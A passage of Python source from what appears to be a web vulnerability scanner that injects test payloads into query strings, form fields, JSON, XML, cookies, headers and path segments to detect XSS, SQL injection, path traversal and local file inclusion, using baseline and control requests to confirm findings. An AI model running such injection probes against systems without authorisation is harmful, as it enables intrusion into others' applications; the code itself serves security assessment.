                full_action = urljoin(base_url, action)
            else:
                full_action = base_url
                
            # Parse inputs
            inputs = []
            input_matches = re.finditer(r'<input(.*?)>', inner_html, re.IGNORECASE)
            for imatch in input_matches:
                iattrs = imatch.group(1)
                name_match = re.search(r'name=["\']([^"\']+)["\']', iattrs, re.IGNORECASE)
                val_match = re.search(r'value=["\']([^"\']+)["\']', iattrs, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']+)["\']', iattrs, re.IGNORECASE)
                
                if name_match:
                    inputs.append({
                        "name": name_match.group(1),
                        "value": val_match.group(1) if val_match else "",
                        "type": type_match.group(1).lower() if type_match else "text"
                    })
            
            # Parse textareas
            textarea_matches = re.finditer(r'<textarea(.*?)name=["\']([^"\']+)["\'](.*?)>(.*?)</textarea>', inner_html, re.IGNORECASE | re.DOTALL)
            for tmatch in textarea_matches:
               inputs.append({
                   "name": tmatch.group(2),
                   "value": tmatch.group(4).strip(),
                   "type": "textarea"
               })

            if inputs:
                forms.append({
                    "action": full_action,
                    "method": method,
                    "inputs": inputs
                })
                
        return forms

    async def _test_url(self, client: httpx.AsyncClient, url: str, original_resp: httpx.Response):
        """Test a URL with all enabled vulnerability payloads."""
        # Run passive checks first (headers, cookies, info disclosure)
        await self._passive_checks(url, original_resp)

        parsed = urlparse(url)
        forms = []
        content_type = (original_resp.headers.get("content-type") or "").lower()
        if "text/html" in content_type:
            forms = self._parse_forms(original_resp.text, url)
        points = self._extract_insertion_points(url, parsed, original_resp, forms)

        # Fallback seeding if no insertion points were extracted.
        if not points:
            for i, (param_name, param_val) in enumerate(COMMON_TEST_PARAMS.items()):
                if i >= 6:
                    break
                points.append({
                    "kind": "query",
                    "url": url,
                    "method": "GET",
                    "name": param_name,
                    "baseline": param_val,
                    "meta": {},
                })

        for point in points:
            if self._cancel_event.is_set():
                return
            await self._run_tests_for_insertion(client, point)

    def _extract_insertion_points(self, url: str, parsed, original_resp: httpx.Response, forms: List[Dict]) -> List[Dict[str, Any]]:
        points: List[Dict[str, Any]] = []
        seen: Set[str] = set()

        def add_point(p: Dict[str, Any]):
            key = f"{p.get('kind')}|{p.get('method')}|{p.get('url')}|{p.get('name')}"
            if key in seen:
                return
            seen.add(key)
            points.append(p)

        # Query parameters.
        for param_name, values in parse_qs(parsed.query).items():
            add_point({
                "kind": "query",
                "url": url,
                "method": "GET",
                "name": param_name,
                "baseline": values[0] if values else "1",
                "meta": {},
            })

        # Path segments as insertion points.
        segments = [s for s in (parsed.path or "/").split("/") if s]
        for idx, segment in enumerate(segments):
            if not segment:
                continue
            add_point({
                "kind": "path",
                "url": url,
                "method": "GET",
                "name": f"path_segment_{idx}",
                "baseline": segment,
                "meta": {"segments": list(segments), "index": idx},
            })

        # HTML forms as body form insertion points.
        for form in forms or []:
            method = str(form.get("method", "POST") or "POST").upper()
            action = str(form.get("action") or url)
            base_form = {inp.get("name"): inp.get("value", "") for inp in (form.get("inputs") or []) if inp.get("name")}
            for field_name, field_val in base_form.items():
                add_point({
                    "kind": "body_form",
                    "url": action,
                    "method": method,
                    "name": field_name,
                    "baseline": str(field_val or "1"),
                    "meta": {"base_form": dict(base_form)},
                })

        ct = (original_resp.headers.get("content-type") or "").lower()
        path_l = (parsed.path or "").lower()
        is_apiish = "/api/" in path_l or path_l.endswith(".json") or "application/json" in ct
        is_xmlish = path_l.endswith(".xml") or "xml" in ct

        # JSON body insertion points.
        if is_apiish:
            base_json = dict(COMMON_JSON_KEYS)
            for k, v in list(base_json.items())[:6]:
                add_point({
                    "kind": "body_json",
                    "url": url,
                    "method": "POST",
                    "name": k,
                    "baseline": str(v),
                    "meta": {"base_json": dict(base_json)},
                })

        # XML body insertion points.
        if is_xmlish:
            base_xml = dict(COMMON_XML_KEYS)
            for k, v in list(base_xml.items())[:5]:
                add_point({
                    "kind": "body_xml",
                    "url": url,
                    "method": "POST",
                    "name": k,
                    "baseline": str(v),
                    "meta": {"base_xml": dict(base_xml)},
                })

        # Cookie insertion points.
        cookie_header = str((self.scan_headers or {}).get("Cookie", "") or "")
        cookie_map = self._parse_cookie_header(cookie_header)
        if not cookie_map:
            cookie_map.update(COMMON_COOKIE_POINTS)
        else:
            for ck, cv in COMMON_COOKIE_POINTS.items():
                cookie_map.setdefault(ck, cv)
        for ck, cv in list(cookie_map.items())[:8]:
            add_point({
                "kind": "cookie",
                "url": url,
                "method": "GET",
                "name": ck,
                "baseline": str(cv),
                "meta": {"base_cookies": dict(cookie_map)},
            })

        # Header insertion points.
        for hk, hv in COMMON_HEADER_POINTS.items():
            add_point({
                "kind": "header",
                "url": url,
                "method": "GET",
                "name": hk,
                "baseline": str(hv),
                "meta": {"base_headers": dict(self.scan_headers or {})},
            })

        return points[:80]

    async def _run_tests_for_insertion(self, client: httpx.AsyncClient, point: Dict[str, Any]):
        param_name = str(point.get("name", "param"))
        url = str(point.get("url", self.target_url))
        parsed = urlparse(url)
        method = str(point.get("method", "GET") or "GET").upper()
        insertion_kind = str(point.get("kind", "query") or "query")
        insertion_meta = point.get("meta") if isinstance(point.get("meta"), dict) else {}
        baseline_val = str(point.get("baseline", "1") or "1")

        if "xss" in self.test_types:
            await self._test_xss(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "sqli" in self.test_types:
            await self._test_sqli(client, url, parsed, param_name, baseline_val, method, insertion_kind, insertion_meta)

        if "path_traversal" in self.test_types:
            await self._test_path_traversal(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "lfi" in self.test_types:
            await self._test_lfi(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "open_redirect" in self.test_types:
            await self._test_open_redirect(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "ssti" in self.test_types:
            await self._test_ssti(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "cmdi" in self.test_types:
            await self._test_cmdi(client, url, parsed, param_name, baseline_val, method, insertion_kind, insertion_meta)

        if "crlf" in self.test_types:
            await self._test_crlf(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "ssrf" in self.test_types:
            await self._test_ssrf(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

        if "cors" in self.test_types:
            await self._test_cors(client, url, parsed)

        if "oast" in self.test_types:
            await self._test_oast(client, url, parsed, param_name, method, insertion_kind, insertion_meta)

    async def _inject_param(
        self,
        client: httpx.AsyncClient,
        parsed,
        param_name: str,
        payload: str,
        timeout_s: float = 12.0,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
        follow_redirects: Optional[bool] = None,
    ) -> Tuple[Optional[httpx.Response], float, str, str, str]:
        """Send a request with a payload injected into a parameter."""
        # Clean method
        method = method.upper()
        self._tests_total += 1
        insertion_kind = (insertion_kind or "query").lower()
        meta = insertion_meta or {}

        # Construct URL/body/headers depending on insertion point type.
        kwargs: Dict[str, Any] = {}
        request_headers: Dict[str, str] = dict(self.scan_headers or {})
        new_url = urlunparse(parsed)

        if insertion_kind == "query":
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
        elif insertion_kind == "body_form":
            base_form = dict(meta.get("base_form", {}))
            if not base_form:
                base_form = {param_name: "1"}
            base_form[param_name] = payload
            kwargs["data"] = base_form
        elif insertion_kind == "body_json":
            base_json = dict(meta.get("base_json", {}))
            if not base_json:
                base_json = {param_name: "1"}
            base_json[param_name] = payload
            kwargs["json"] = base_json
            request_headers.setdefault("Content-Type", "application/json")
        elif insertion_kind == "body_xml":
            base_xml = dict(meta.get("base_xml", {}))
            if not base_xml:
                base_xml = {param_name: "1"}
            base_xml[param_name] = payload
            kwargs["content"] = self._build_xml_body(base_xml)
            request_headers.setdefault("Content-Type", "application/xml")
        elif insertion_kind == "cookie":
            cookie_map = dict(meta.get("base_cookies", {}))
            if not cookie_map:
                cookie_map = self._parse_cookie_header(str(request_headers.get("Cookie", "") or ""))
            cookie_map[param_name] = payload
            request_headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in cookie_map.items()])
        elif insertion_kind == "header":
            request_headers[param_name] = payload
        elif insertion_kind == "path":
            segments = list(meta.get("segments", []))
            idx = int(meta.get("index", 0))
            if segments and 0 <= idx < len(segments):
                segments[idx] = quote(payload, safe="")
            rebuilt_path = "/" + "/".join(segments) if segments else "/" + quote(payload, safe="")
            new_url = urlunparse(parsed._replace(path=rebuilt_path))
        else:
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

        started = time.perf_counter()
        req_raw = ""
        res_raw = ""
        try:
            request = client.build_request(method, new_url, headers=request_headers, **kwargs)

            # Build consistent raw request
            body_text = ""
            if request.content:
                try:
                    body_text = request.content.decode('utf-8', errors='replace')
                except Exception:
                    body_text = f"[Binary Content: {len(request.content)} bytes]"
            req_raw = self._build_raw_request(
                method=method,
                url=str(request.url),
                headers=dict(request.headers),
                body=body_text,
            )

            send_kwargs = {"timeout": timeout_s}
            if follow_redirects is not None:
                send_kwargs["follow_redirects"] = follow_redirects
            resp = await client.send(request, **send_kwargs)
            elapsed = time.perf_counter() - started

            # Build consistent raw response
            res_raw = self._build_raw_response(resp)

            self._requests_sent += 1
            self._tests_completed += 1
            await self._emit_progress()
            return resp, elapsed, new_url, req_raw, res_raw
        except Exception:
            elapsed = time.perf_counter() - started
            self._errors_count += 1
            self._tests_completed += 1
            await self._emit_progress()
            return None, elapsed, new_url, req_raw, res_raw

    async def _test_xss(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        baseline_resp, _baseline_elapsed, _baseline_url, _baseline_req_raw, baseline_res_raw = await self._inject_param(
            client, parsed, param_name, "greytab_baseline", method=method,
            insertion_kind=insertion_kind, insertion_meta=insertion_meta,
        )
        baseline_text = baseline_resp.text if baseline_resp else baseline_res_raw
        await self._record_test_entry(
            url=url,
            method=method,
            test_type="xss",
            parameter=param_name,
            payload="greytab_baseline",
            stage="baseline",
            outcome="baseline" if baseline_resp else "error",
            success=baseline_resp is not None,
            elapsed_s=float(_baseline_elapsed or 0.0),
            status_code=int(baseline_resp.status_code if baseline_resp else 0),
            evidence="Baseline reflection check",
            request_raw=_baseline_req_raw,
            response_raw=baseline_res_raw,
        )

        for template in XSS_PAYLOAD_TEMPLATES:
            if self._cancel_event.is_set():
                return

            marker = hashlib.md5(f"{url}:{param_name}:{time.time_ns()}".encode()).hexdigest()[:8]
            payload = template.replace("{m}", marker)
            resp, elapsed, _new_url, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="xss",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="error",
                    success=False,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=0,
                    evidence="Request failed",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            content_type = (resp.headers.get("content-type") or "").lower()
            if not any(t in content_type for t in ("html", "javascript", "json", "xml", "text")):
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="xss",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence=f"Skipped due to non-text content-type: {content_type[:120]}",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            body = resp.text
            reflected = (
                marker in body
                or marker in html.unescape(body)
                or html.escape(marker) in body
                or quote(marker) in body
            )
            baseline_has_marker = marker in baseline_text or html.escape(marker) in baseline_text
            looks_executable = self._looks_xss_execution_context(body, marker)

            if not reflected or baseline_has_marker:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="xss",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence="No unique reflection signal",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            # Confirmation run with a second unique marker to reduce random reflections.
            confirm_marker = hashlib.md5(f"confirm:{url}:{param_name}:{time.time_ns()}".encode()).hexdigest()[:8]
            confirm_payload = template.replace("{m}", confirm_marker)
            resp2, elapsed2, _url2, req2, res2 = await self._inject_param(
                client, parsed, param_name, confirm_payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            confirm_reflected = False
            confirm_exec_ctx = False
            if resp2:
                body2 = resp2.text
                confirm_reflected = (
                    confirm_marker in body2
                    or confirm_marker in html.unescape(body2)
                    or html.escape(confirm_marker) in body2
                    or quote(confirm_marker) in body2
                )
                confirm_exec_ctx = self._looks_xss_execution_context(body2, confirm_marker)

            headless_exec = False
            if self._xss_headless_confirm and resp2 and confirm_reflected:
                headless_exec = await self._confirm_xss_headless(resp2.text, confirm_marker)
            confirmed = bool(
                confirm_reflected
                and (looks_executable or confirm_exec_ctx)
                and (headless_exec or not self._xss_headless_confirm)
            )

            await self._record_test_entry(
                url=url,
                method=method,
                test_type="xss",
                parameter=param_name,
                payload=payload,
                stage="probe",
                outcome="signal" if reflected else "no_signal",
                success=True,
                elapsed_s=float(elapsed or 0.0),
                status_code=resp.status_code,
                evidence=(
                    f"Reflected marker={marker}; executable_context={'yes' if looks_executable else 'no'}"
                ),
                request_raw=req_raw,
                response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="xss",
                parameter=param_name,
                payload=confirm_payload,
                stage="confirm",
                outcome="confirmed" if confirmed else ("signal" if confirm_reflected else "no_signal"),
                success=resp2 is not None,
                elapsed_s=float(elapsed2 or 0.0),
                status_code=int(resp2.status_code if resp2 else 0),
                evidence=(
                    f"Confirm reflection={confirm_reflected}; confirm_exec_ctx={'yes' if confirm_exec_ctx else 'no'}; "
                    f"headless_exec={'yes' if headless_exec else 'no'}"
                ),
                request_raw=req2,
                response_raw=res2,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="xss",
                        severity="high",
                        evidence=(
                            f"Confirmed reflected XSS behavior. marker1={marker}, marker2={confirm_marker}, "
                            f"context={('primary' if looks_executable else 'secondary')}, "
                            f"headless_exec={'yes' if headless_exec else 'no'}"
                        ),
                        payload=payload,
                        parameter=param_name,
                        request_raw=req2 or req_raw,
                        response_raw=res2 or res_raw,
                        deterministic_confirmed=True,
                        insertion_point=insertion_kind,
                    )
                )
                return

    async def _test_sqli(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        baseline_val: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        baseline_samples: List[float] = []
        for i in range(3):
            b_resp, b_time, _, b_req, b_res = await self._inject_param(
                client, parsed, param_name, baseline_val, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            baseline_samples.append(float(b_time or 0.0))
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="sqli",
                parameter=param_name,
                payload=baseline_val,
                stage="baseline",
                outcome="baseline" if b_resp else "error",
                success=b_resp is not None,
                elapsed_s=float(b_time or 0.0),
                status_code=int(b_resp.status_code if b_resp else 0),
                evidence=f"Baseline sample {i + 1}/3",
                request_raw=b_req,
                response_raw=b_res,
            )

        baseline_median, baseline_std = self._median_and_std(baseline_samples)
        delay_threshold = max(3.8, baseline_median + max(1.8, baseline_std * 3.0))

        for payload in SQLI_ERROR_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="sqli_error",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="error",
                    success=False,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=0,
                    evidence="Request failed",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            matched_pattern = ""
            for pattern in SQLI_ERROR_PATTERNS:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    matched_pattern = pattern
                    break

            if not matched_pattern:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="sqli_error",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence="No SQL error signatures matched",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            # Confirmation: replay same payload + control payload.
            resp2, elapsed2, _, req2, res2 = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            confirm_match = bool(resp2 and re.search(matched_pattern, resp2.text, re.IGNORECASE))
            control_payload = f"{baseline_val}_ctrl"
            ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                client, parsed, param_name, control_payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            control_match = bool(ctrl_resp and re.search(matched_pattern, ctrl_resp.text, re.IGNORECASE))
            confirmed = bool(confirm_match and not control_match)

            await self._record_test_entry(
                url=url,
                method=method,
                test_type="sqli_error",
                parameter=param_name,
                payload=payload,
                stage="probe",
                outcome="signal",
                success=True,
                elapsed_s=float(elapsed or 0.0),
                status_code=resp.status_code,
                evidence=f"Matched SQL error pattern: {matched_pattern}",
                request_raw=req_raw,
                response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="sqli_error",
                parameter=param_name,
                payload=payload,
                stage="confirm",
                outcome="confirmed" if confirmed else ("signal" if confirm_match else "no_signal"),
                success=resp2 is not None,
                elapsed_s=float(elapsed2 or 0.0),
                status_code=int(resp2.status_code if resp2 else 0),
                evidence=f"Confirm replay match={confirm_match}",
                request_raw=req2,
                response_raw=res2,
            )
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="sqli_error",
                parameter=param_name,
                payload=control_payload,
                stage="control",
                outcome="signal" if control_match else "no_signal",
                success=ctrl_resp is not None,
                elapsed_s=float(ctrl_elapsed or 0.0),
                status_code=int(ctrl_resp.status_code if ctrl_resp else 0),
                evidence=f"Control pattern match={control_match}",
                request_raw=ctrl_req,
                response_raw=ctrl_res,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="sqli",
                        severity="critical",
                        evidence=(
                            f"Confirmed SQL error-based behavior with pattern '{matched_pattern}'. "
                            f"confirm_match={confirm_match}, control_match={control_match}"
                        ),
                        payload=payload,
                        parameter=param_name,
                        request_raw=req2 or req_raw,
                        response_raw=res2 or res_raw,
                        deterministic_confirmed=True,
                        insertion_point=insertion_kind,
                    )
                )
                return

        for payload in SQLI_TIME_PAYLOADS:
            if self._cancel_event.is_set():
                return

            probe_times: List[float] = []
            probe_req_raw = ""
            probe_res_raw = ""
            probe_status = 0
            probe_success = 0
            for idx in range(3):
                _resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                    client, parsed, param_name, payload, timeout_s=18.0, method=method,
                    insertion_kind=insertion_kind, insertion_meta=insertion_meta,
                )
                probe_times.append(float(elapsed or 0.0))
                delayed = elapsed >= delay_threshold
                if _resp is not None:
                    probe_success += 1
                    probe_status = _resp.status_code
                if idx == 0:
                    probe_req_raw = req_raw
                    probe_res_raw = res_raw
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="sqli_time",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="error" if _resp is None else ("signal" if delayed else "no_signal"),
                    success=_resp is not None,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=int(_resp.status_code if _resp else 0),
                    evidence=f"Delay probe sample {idx + 1}/3 elapsed={elapsed:.2f}s threshold={delay_threshold:.2f}s",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )

            control_payload = f"{baseline_val}_time_ctrl"
            control_times: List[float] = []
            ctrl_req_raw = ""
            ctrl_res_raw = ""
            for idx in range(2):
                _ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                    client, parsed, param_name, control_payload, timeout_s=18.0, method=method,
                    insertion_kind=insertion_kind, insertion_meta=insertion_meta,
                )
                control_times.append(float(ctrl_elapsed or 0.0))
                if idx == 0:
                    ctrl_req_raw = ctrl_req
                    ctrl_res_raw = ctrl_res
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="sqli_time",
                    parameter=param_name,
                    payload=control_payload,
                    stage="control",
                    outcome="error" if _ctrl_resp is None else ("no_signal" if ctrl_elapsed < delay_threshold else "signal"),
                    success=_ctrl_resp is not None,
                    elapsed_s=float(ctrl_elapsed or 0.0),
                    status_code=int(_ctrl_resp.status_code if _ctrl_resp else 0),
                    evidence=f"Control sample {idx + 1}/2 elapsed={ctrl_elapsed:.2f}s threshold={delay_threshold:.2f}s",
                    request_raw=ctrl_req,
                    response_raw=ctrl_res,
                )

            probe_median, probe_std = self._median_and_std(probe_times)
            ctrl_median, ctrl_std = self._median_and_std(control_times)
            delayed_count = sum(1 for x in probe_times if x >= delay_threshold)
            confirmed = bool(
                probe_success >= 2
                and delayed_count >= 2
                and probe_median >= delay_threshold
                and ctrl_median < delay_threshold
                and (probe_median - ctrl_median) >= 2.0
            )

            await self._record_test_entry(
                url=url,
                method=method,
                test_type="sqli_time",
                parameter=param_name,
                payload=payload,
                stage="confirm",
                outcome="confirmed" if confirmed else ("signal" if delayed_count >= 2 else "no_signal"),
                success=True,
                elapsed_s=float(probe_median or 0.0),
                status_code=int(probe_status or 0),
                evidence=(
                    f"probe_median={probe_median:.2f}s std={probe_std:.2f}s delayed_count={delayed_count}/3 "
                    f"control_median={ctrl_median:.2f}s std={ctrl_std:.2f}s threshold={delay_threshold:.2f}s"
                ),
                request_raw=probe_req_raw,
                response_raw=probe_res_raw,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="sqli",
                        severity="high",
                        evidence=(
                            "Time-based SQLi behavior confirmed via repeated delay and control baseline. "
                            f"baseline_median={baseline_median:.2f}s std={baseline_std:.2f}s "
                            f"threshold={delay_threshold:.2f}s probe_median={probe_median:.2f}s "
                            f"probe_std={probe_std:.2f}s control_median={ctrl_median:.2f}s control_std={ctrl_std:.2f}s"
                        ),
                        payload=payload,
                        parameter=param_name,
                        request_raw=probe_req_raw or ctrl_req_raw,
                        response_raw=probe_res_raw or ctrl_res_raw,
                        deterministic_confirmed=True,
                        insertion_point=insertion_kind,
                    )
                )
                return

    async def _test_path_traversal(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        baseline_payload = "greytab_not_exists_file.txt"
        b_resp, b_elapsed, _, b_req, b_res = await self._inject_param(
            client, parsed, param_name, baseline_payload, method=method,
            insertion_kind=insertion_kind, insertion_meta=insertion_meta,
        )
        await self._record_test_entry(
            url=url,
            method=method,
            test_type="path_traversal",
            parameter=param_name,
            payload=baseline_payload,
            stage="baseline",
            outcome="baseline" if b_resp else "error",
            success=b_resp is not None,
            elapsed_s=float(b_elapsed or 0.0),
            status_code=int(b_resp.status_code if b_resp else 0),
            evidence="Baseline file fetch behavior",
            request_raw=b_req,
            response_raw=b_res,
        )

        for payload in PATH_TRAVERSAL_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="path_traversal",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="error",
                    success=False,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=0,
                    evidence="Request failed",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            lower_body = resp.text.lower()
            matched_sig = ""
            for sig in PATH_TRAVERSAL_SIGNATURES:
                if sig.lower() in lower_body:
                    matched_sig = sig
                    break

            if not matched_sig:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="path_traversal",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence="No traversal signatures detected",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            control_payload = f"greytab_no_file_{hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:6]}"
            ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                client, parsed, param_name, control_payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            ctrl_has_sig = False
            if ctrl_resp:
                ctrl_body = ctrl_resp.text.lower()
                ctrl_has_sig = any(sig.lower() in ctrl_body for sig in PATH_TRAVERSAL_SIGNATURES)
            structural_diff = self._has_structural_diff(b_resp, resp)
            confirmed = bool(ctrl_resp is not None and not ctrl_has_sig and structural_diff)

            await self._record_test_entry(
                url=url,
                method=method,
                test_type="path_traversal",
                parameter=param_name,
                payload=payload,
                stage="probe",
                outcome="signal",
                success=True,
                elapsed_s=float(elapsed or 0.0),
                status_code=resp.status_code,
                evidence=f"Matched traversal signature: {matched_sig}; structural_diff={structural_diff}",
                request_raw=req_raw,
                response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="path_traversal",
                parameter=param_name,
                payload=control_payload,
                stage="control",
                outcome="no_signal" if confirmed else "signal",
                success=ctrl_resp is not None,
                elapsed_s=float(ctrl_elapsed or 0.0),
                status_code=int(ctrl_resp.status_code if ctrl_resp else 0),
                evidence=f"Control signature present={ctrl_has_sig}; structural_diff={structural_diff}",
                request_raw=ctrl_req,
                response_raw=ctrl_res,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url,
                        vuln_type="path_traversal",
                        severity="critical",
                        evidence=f"Confirmed path traversal signature found: {matched_sig} with structural response diff",
                        payload=payload,
                        parameter=param_name,
                        request_raw=req_raw,
                        response_raw=res_raw,
                        deterministic_confirmed=True,
                        insertion_point=insertion_kind,
                    )
                )
                return

    async def _test_lfi(
        self,
        client,
        url: str,
        parsed,
        param_name: str,
        method: str = "GET",
        insertion_kind: str = "query",
        insertion_meta: Optional[Dict[str, Any]] = None,
    ):
        baseline_payload = "greytab_lfi_baseline"
        b_resp, b_elapsed, _, b_req, b_res = await self._inject_param(
            client, parsed, param_name, baseline_payload, method=method,
            insertion_kind=insertion_kind, insertion_meta=insertion_meta,
        )
        await self._record_test_entry(
            url=url,
            method=method,
            test_type="lfi",
            parameter=param_name,
            payload=baseline_payload,
            stage="baseline",
            outcome="baseline" if b_resp else "error",
            success=b_resp is not None,
            elapsed_s=float(b_elapsed or 0.0),
            status_code=int(b_resp.status_code if b_resp else 0),
            evidence="Baseline local-file inclusion behavior",
            request_raw=b_req,
            response_raw=b_res,
        )

        for payload in LFI_PAYLOADS:
            if self._cancel_event.is_set():
                return

            resp, elapsed, _, req_raw, res_raw = await self._inject_param(
                client, parsed, param_name, payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            if not resp:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="lfi",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="error",
                    success=False,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=0,
                    evidence="Request failed",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            lower_body = resp.text.lower()
            matched_sig = ""
            for sig in LFI_SIGNATURES:
                if sig.lower() in lower_body:
                    matched_sig = sig
                    break

            if not matched_sig:
                await self._record_test_entry(
                    url=url,
                    method=method,
                    test_type="lfi",
                    parameter=param_name,
                    payload=payload,
                    stage="probe",
                    outcome="no_signal",
                    success=True,
                    elapsed_s=float(elapsed or 0.0),
                    status_code=resp.status_code,
                    evidence="No LFI signatures detected",
                    request_raw=req_raw,
                    response_raw=res_raw,
                )
                continue

            control_payload = f"greytab_lfi_control_{hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:6]}"
            ctrl_resp, ctrl_elapsed, _, ctrl_req, ctrl_res = await self._inject_param(
                client, parsed, param_name, control_payload, method=method,
                insertion_kind=insertion_kind, insertion_meta=insertion_meta,
            )
            ctrl_has_sig = False
            if ctrl_resp:
                ctrl_body = ctrl_resp.text.lower()
                ctrl_has_sig = any(sig.lower() in ctrl_body for sig in LFI_SIGNATURES)
            structural_diff = self._has_structural_diff(b_resp, resp)
            confirmed = bool(ctrl_resp is not None and not ctrl_has_sig and structural_diff)

            await self._record_test_entry(
                url=url,
                method=method,
                test_type="lfi",
                parameter=param_name,
                payload=payload,
                stage="probe",
                outcome="signal",
                success=True,
                elapsed_s=float(elapsed or 0.0),
                status_code=resp.status_code,
                evidence=f"Matched LFI signature: {matched_sig}; structural_diff={structural_diff}",
                request_raw=req_raw,
                response_raw=res_raw,
            )
            await self._record_test_entry(
                url=url,
                method=method,
                test_type="lfi",
                parameter=param_name,
                payload=control_payload,
                stage="control",
                outcome="no_signal" if confirmed else "signal",
                success=ctrl_resp is not None,
                elapsed_s=float(ctrl_elapsed or 0.0),
                status_code=int(ctrl_resp.status_code if ctrl_resp else 0),
                evidence=f"Control signature present={ctrl_has_sig}; structural_diff={structural_diff}",
                request_raw=ctrl_req,
                response_raw=ctrl_res,
            )

            if confirmed:
                await self._add_finding(
                    ScanFinding(
                        url=url,
